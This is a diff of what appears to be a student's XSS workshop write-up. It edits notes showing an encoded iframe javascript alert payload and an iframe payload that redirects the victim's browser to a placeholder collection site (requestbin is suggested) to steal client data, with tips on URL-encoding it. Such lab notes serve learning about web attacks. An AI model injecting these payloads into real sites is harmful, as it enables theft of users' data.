@@ -52,10 +52,10 @@ Enter: <iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
 ![image](https://user-images.githubusercontent.com/72589672/141679658-d95d90e7-4530-4817-a0e6-8d5c44eba3e0.png)
 ![image](https://user-images.githubusercontent.com/72589672/141679638-8bb2cc8b-e04f-4796-b45a-44dc688f1f6e.png)
 
-Then, I can use a website to collect data to steal the data from the client.
+Then, I can use a website to steal the data from the client.
 The workshop suggested me to use https://requestbin.com/, so I registed it.
 
-Therefore, I can use <iframe src=javascript:javascript:location.href='http://yourwebsiteurl/'></iframe>
+Therefore, I can use <iframe src=javascript:location.href='http://yourwebsiteurl/'></iframe>
 Before inject the code into the textarea, we need to encode the url. I used this website https://www.browserling.com/tools/utf8-encode to encode.
 ![image](https://user-images.githubusercontent.com/72589672/141680425-8352c127-f9fb-4550-99d1-61abcf69733b.png)
 Remember: Replace '\x' to '%'
